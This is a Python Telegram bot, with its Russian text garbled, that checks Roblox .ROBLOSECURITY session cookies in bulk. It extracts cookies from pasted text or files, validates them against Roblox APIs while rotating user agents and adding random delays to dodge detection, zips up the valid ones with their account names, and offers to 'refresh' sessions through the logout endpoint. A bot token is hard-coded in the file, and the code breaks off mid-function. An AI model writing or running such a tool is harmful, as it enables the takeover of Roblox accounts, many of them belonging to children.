import os
import logging
import re
import random
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"

logging.basicConfig(level=logging.INFO)

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}  # –•—Ä–∞–Ω–∏–ª–∏—â–µ –∫—É–∫–∏ –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
        self.subscriptions = {}  # –•—Ä–∞–Ω–∏–ª–∏—â–µ –ø–æ–¥–ø–∏—Å–æ–∫
        
    def get_random_user_agent(self):
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π User-Agent"""
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        """–í—ã–ø–æ–ª–Ω—è–µ—Ç –∑–∞–ø—Ä–æ—Å —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏ –∏ –∑–∞–¥–µ—Ä–∂–∫–∞–º–∏"""
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ª–∏–º–∏—Ç –∑–∞–ø—Ä–æ—Å–æ–≤
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"‚ö†Ô∏è Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                    
                return response
                
            except requests.exceptions.RequestException as e:
                print(f"‚ö†Ô∏è Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
                    
        return None

    def extract_cookies_from_text(self, text):
        """–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫—É–∫–∏ –∏–∑ —Ç–µ–∫—Å—Ç–∞"""
        cookies = []
        
        # –ú–µ—Ç–æ–¥ 1: –ü–æ–∏—Å–∫ –ø–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º—É –ø–∞—Ç—Ç–µ—Ä–Ω—É
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
        warning_matches = re.findall(warning_pattern, text)
        
        for match in warning_matches:
            cookie_candidate = match.strip()
            if len(cookie_candidate) > 50:
                cookies.append(cookie_candidate)
                print(f"üîç –ù–∞–π–¥–µ–Ω–∞ –∫—É–∫–∏: {cookie_candidate[:80]}...")
        
        # –ú–µ—Ç–æ–¥ 2: –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ–¥–∏–Ω–æ—á–Ω–æ–π —á–∏—Å—Ç–æ–π –∫—É–∫–∏
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
                cookies.append(clean_text)
                print(f"üîç –ù–∞–π–¥–µ–Ω–∞ —á–∏—Å—Ç–∞—è –∫—É–∫–∏: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        """–û—á–∏—Å—Ç–∫–∞ –∫—É–∫–∏"""
        return cookie_data.strip()

    def refresh_cookie_with_auth_key(self, cookie_data, auth_key):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏ —á–µ—Ä–µ–∑ auth key"""
        try:
            # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—É–∫–∏ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –∑–∞–ø—Ä–æ—Å–µ
            if not cookie_data.startswith('.ROBLOSECURITY='):
                cookie_string = f'.ROBLOSECURITY={cookie_data}'
            else:
                cookie_string = cookie_data
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_string,
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': auth_key
            }
            
            # –ó–∞–ø—Ä–æ—Å –Ω–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏ —á–µ—Ä–µ–∑ Roblox API
            refresh_url = 'https://auth.roblox.com/v2/logout'
            response = requests.post(refresh_url, headers=headers, timeout=10)
            
            if response.status_code == 200 or response.status_code == 403:
                # –ü–æ–ª—É—á–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∫—É–∫–∏ –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
                if 'set-cookie' in response.headers:
                    new_cookies = response.headers['set-cookie']
                    # –ò—â–µ–º –Ω–æ–≤—É—é –∫—É–∫–∏ ROBLOSECURITY
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        return True, new_cookie, "‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞"
            
            return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏"
            
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫—É–∫–∏: {e}")
            return False, cookie_data, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

    def simple_cookie_validation(self, cookie_data):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏"""
        self.checked_count += 1
        
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –∑–∞–ø—Ä–æ—Å–µ
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        # –°–ª—É—á–∞–π–Ω—ã–π User-Agent –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        # –î–æ–±–∞–≤–ª—è–µ–º –Ω–µ–±–æ–ª—å—à—É—é –∑–∞–¥–µ—Ä–∂–∫—É –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
        time.sleep(random.uniform(1, 3))
        
        try:
            # –ü—Ä–æ–±—É–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π API
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
                
            # –ü—Ä–æ–±—É–µ–º mobile API —Å –¥—Ä—É–≥–∏–º User-Agent
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
            
            # –ü—Ä–æ–±—É–µ–º –¥–æ–º–∞—à–Ω—é—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "‚úÖ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: {e}")
            return False, cookie_clean, f"‚ùå ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "‚ùå INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö –∫—É–∫–∏ —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –¥–ª—è —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"üîç –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "‚ùå –í —Ç–µ–∫—Å—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–π –∫—É–∫–∏"
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫—É–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"üîç –ü—Ä–æ–≤–µ—Ä—è—é –∫—É–∫–∏ {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"‚úÖ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"‚ùå {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        """–°–æ–∑–¥–∞–Ω–∏–µ –æ—Ç–¥–µ–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –¥–ª—è –∫–∞–∂–¥–æ–π –∫—É–∫–∏"""
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        # –°–æ–∑–¥–∞–µ–º ZIP –∞—Ä—Ö–∏–≤ —Å –æ—Ç–¥–µ–ª—å–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                # –°–æ–∑–¥–∞–µ–º –∏–º—è —Ñ–∞–π–ª–∞
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                # –î–æ–±–∞–≤–ª—è–µ–º –≤ ZIP
                zipf.write(filename, filename)
                
                # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                os.remove(filename)
        
        return zip_filename

    def subscribe_user(self, user_id, cookie_index, auth_key):
        """–ü–æ–¥–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏"""
        if user_id not in self.user_cookies:
            return False, "‚ùå –ö—É–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã"
        
        if cookie_index >= len(self.user_cookies[user_id]['valid_cookies']):
            return False, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∏–Ω–¥–µ–∫—Å –∫—É–∫–∏"
        
        cookie = self.user_cookies[user_id]['valid_cookies'][cookie_index]
        username = self.user_cookies[user_id]['usernames'][cookie_index]
        user_id_val = self.user_cookies[user_id]['user_ids'][cookie_index]
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ–¥–ø–∏—Å–∫—É
        self.subscriptions[user_id] = {
            'cookie': cookie,
            'username': username,
            'user_id': user_id_val,
            'auth_key': auth_key,
            'subscribe_date': datetime.now(),
            'last_refresh': datetime.now()
        }
        
        return True, f"‚úÖ –ü–æ–¥–ø–∏—Å–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –¥–ª—è {username}"

    def refresh_subscribed_cookie(self, user_id):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏ –ø–æ –ø–æ–¥–ø–∏—Å–∫–µ"""
        if user_id not in self.subscriptions:
            return False, "‚ùå –ü–æ–¥–ø–∏—Å–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞"
        
        subscription = self.subscriptions[user_id]
        cookie = subscription['cookie']
        auth_key = subscription['auth_key']
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –∫—É–∫–∏
        success, new_cookie, message = self.refresh_cookie_with_auth_key(cookie, auth_key)
        
        if success:
            # –û–±–Ω–æ–≤–ª—è–µ–º –ø–æ–¥–ø–∏—Å–∫—É
            self.subscriptions[user_id]['cookie'] = new_cookie
            self.subscriptions[user_id]['last_refresh'] = datetime.now()
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å –Ω–æ–≤–æ–π –∫—É–∫–∏
            is_valid, _, status, username, _ = self.simple_cookie_validation(new_cookie)
            if is_valid:
                return True, f"‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –∏ –≤–∞–ª–∏–¥–Ω–∞\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}"
            else:
                return False, "‚ùå –ö—É–∫–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∞, –Ω–æ –Ω–µ –ø—Ä–æ—à–ª–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
        else:
            return False, message

checker = RobloxCookieChecker()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "üîç –ë–æ—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Roblox –∫—É–∫–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω\n\n"
        "–ü—Ä–æ—Å—Ç–∞—è –∏ –±—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏.\n\n"
        "–ö–æ–º–∞–Ω–¥—ã:\n"
        "/start - –∑–∞–ø—É—Å–∫\n"
        "/stats - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞\n"
        "/mysub - –º–æ—è –ø–æ–¥–ø–∏—Å–∫–∞\n\n"
        "–ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ —Ç–µ–∫—Å—Ç–æ–º –∏–ª–∏ —Ñ–∞–π–ª–æ–º –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏."
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"""
üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–í–ï–†–û–ö:

‚Ä¢ –í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ: {checker.checked_count}
‚Ä¢ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: {checker.valid_count}
‚Ä¢ –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.checked_count - checker.valid_count}
‚Ä¢ –ü—Ä–æ—Ü–µ–Ω—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
‚Ä¢ –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–ø–∏—Å–æ–∫: {len(checker.subscriptions)}
"""
    await update.message.reply_text(stats_text)

async def mysub_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in checker.subscriptions:
        subscription = checker.subscriptions[user_id]
        sub_date = subscription['subscribe_date'].strftime("%d.%m.%Y %H:%M")
        last_refresh = subscription['last_refresh'].strftime("%d.%m.%Y %H:%M")
        
        sub_info = f"""
üìã –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ü–û–î–ü–ò–°–ö–ï:

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {subscription['username']}
üÜî ID: {subscription['user_id']}
üìÖ –î–∞—Ç–∞ –ø–æ–¥–ø–∏—Å–∫–∏: {sub_date}
üîÑ –ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: {last_refresh}

–î–æ—Å—Ç—É–ø–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è:
"""
        keyboard = [
            [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏", callback_data="refresh_cookie")],
            [InlineKeyboardButton("‚ùå –û—Ç–º–µ–Ω–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É", callback_data="cancel_subscription")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(sub_info, reply_markup=reply_markup)
    else:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–∏")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if update.message.text:
        text_content = update.message.text
        await update.message.reply_text("üîç –ò—â—É –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ.")
            return
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏
        if valid_cookies:
            keyboard = [
                [InlineKeyboardButton("üìÅ –†–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ —Ñ–∞–π–ª–∞–º", callback_data="distribute_files")],
                [InlineKeyboardButton("üì¶ –°–∫–∞—á–∞—Ç—å –æ–±—â–∏–π —Ñ–∞–π–ª", callback_data="download_combined")],
                [InlineKeyboardButton("üíé –ü–æ–¥–ø–∏—Å–∫–∞ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä", callback_data="subscription_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            summary = f"""
üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´:

‚Ä¢ –í—Å–µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {len(valid_cookies) + len(invalid_cookies)}
‚Ä¢ ‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {len(valid_cookies)}
‚Ä¢ ‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {len(invalid_cookies)}
‚Ä¢ üìä –£—Å–ø–µ—Ö: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
"""
            await update.message.reply_text(summary, reply_markup=reply_markup)
        else:
            await send_results(update, user_id, valid_cookies, invalid_cookies, process_results)

    elif update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await update.message.reply_text("üîç –û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é —Ñ–∞–π–ª...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –∫—É–∫–∏")
            os.remove(file_path)
            return
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏
        if valid_cookies:
            keyboard = [
                [InlineKeyboardButton("üìÅ –†–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ —Ñ–∞–π–ª–∞–º", callback_data="distribute_files")],
                [InlineKeyboardButton("üì¶ –°–∫–∞—á–∞—Ç—å –æ–±—â–∏–π —Ñ–∞–π–ª", callback_data="download_combined")],
                [InlineKeyboardButton("üíé –ü–æ–¥–ø–∏—Å–∫–∞ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä", callback_data="subscription_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            summary = f"""
üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´:

‚Ä¢ –í—Å–µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {len(valid_cookies) + len(invalid_cookies)}
‚Ä¢ ‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {len(valid_cookies)}
‚Ä¢ ‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {len(invalid_cookies)}
‚Ä¢ üìä –£—Å–ø–µ—Ö: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
"""
            await update.message.reply_text(summary, reply_markup=reply_markup)
        else:
            await send_results(update, user_id, valid_cookies, invalid_cookies, process_results)
        os.remove(file_path)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "distribute_files":
        await query.edit_message_text("üìÅ –°–æ–∑–¥–∞—é –æ—Ç–¥–µ–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –¥–ª—è –∫–∞–∂–¥–æ–π –∫—É–∫–∏...")
        
        zip_filename = checker.create_individual_files(user_id)
        
        if zip_filename and os.path.exists(zip_filename):
            with open(zip_filename, 'rb') as zip_file:
                await query.message.reply_document(
                    document=zip_file,
                    caption=f"üìÅ –ê—Ä—Ö–∏–≤ —Å {len(checker.user_cookies[user_id]['valid_cookies'])} –æ—Ç–¥–µ–ª—å–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏ –∫—É–∫–∏"
                )
            os.remove(zip_filename)
        else:
            await query.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª—ã —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è")
    
    elif query.data == "download_combined":
        await send_results(query, user_id, 
                          checker.user_cookies[user_id]['valid_cookies'], 
                          checker.user_cookies[user_id]['invalid_cookies'], 
                          "")
    
    elif query.data == "subscription_menu":
        if user_id not in checker.user_cookies or not checker.user_cookies[user_id]['valid_cookies']:
            await query.edit_message_text("‚ùå –ù–µ—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏ –¥–ª—è –ø–æ–¥–ø–∏—Å–∫–∏")
            return
        
        valid_cookies = checker.user_cookies[user_id]['valid_cookies']
        usernames = checker.user_cookies[user_id]['usernames']
        
        # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è –≤—ã–±–æ—Ä–∞ –∫—É–∫–∏
        keyboard = []
        for i, (cookie, username) in enumerate(zip(valid_cookies, usernames)):
            keyboard.append([InlineKeyboardButton(f"üë§ {username}", callback_data=f"subscribe_{i}")])
        
        keyboard.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "üíé –í–´–ë–ï–†–ò–¢–ï –ö–£–ö–ò –î–õ–Ø –ü–û–î–ü–ò–°–ö–ò:\n\n"
            "–ü–æ–¥–ø–∏—Å–∫–∞ –≤–∫–ª—é—á–∞–µ—Ç:\n"
            "‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏\n"
            "‚Ä¢ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏ —á–µ—Ä–µ–∑ auth key\n"
            "‚Ä¢ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å—Ç–∞—Ç—É—Å–µ\n\n"
            "–í—ã–±–µ—Ä–∏—Ç–µ –∞–∫–∫–∞—É–Ω—Ç:",
            reply_markup=reply_markup
        )
    
    elif query.data.startswith("subscribe_"):
        cookie_index = int(query.data.split("_")[1])
        await query.edit_message_text(
            f"üîê –í–≤–µ–¥–∏—Ç–µ auth key –¥–ª—è –ø–æ–¥–ø–∏—Å–∫–∏:\n\n"
            f"–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è auth key:\n"
            f"1. –û—Ç–∫—Ä–æ–π—Ç–µ –±—Ä–∞—É–∑–µ—Ä\n"
            f"2. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ Roblox.com\n"
            f"3. –û—Ç–∫—Ä–æ–π—Ç–µ Developer Tools (F12)\n"
            f"4. –ù–∞–π–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ X-CSRF-TOKEN –≤ –∑–∞–ø—Ä–æ—Å–∞—Ö\n\n"
            f"–û—Ç–ø—Ä–∞–≤—å—Ç–µ auth key —Ç–µ–∫—Å—Ç–æ–≤—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º:"
        )
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω–¥–µ–∫—Å –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∫—É–∫–∏ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ
        context.user_data['selected_cookie_index'] = cookie_index
    
    elif query.data == "refresh_cookie":
        await query.edit_message_text("üîÑ –û–±–Ω–æ–≤–ª—è—é –∫—É–∫–∏...")
        success, message = checker.refresh_subscribed_cookie(user_id)
        await query.edit_message_text(message)
    
    elif query.data == "cancel_subscription":
        if user_id in checker.subscriptions:
            username = checker.subscriptions[user_id]['username']
            del checker.subscriptions[user_id]
            await query.edit_message_text(f"‚ùå –ü–æ–¥–ø–∏—Å–∫–∞ –¥–ª—è {username} –æ—Ç–º–µ–Ω–µ–Ω–∞")
        else:
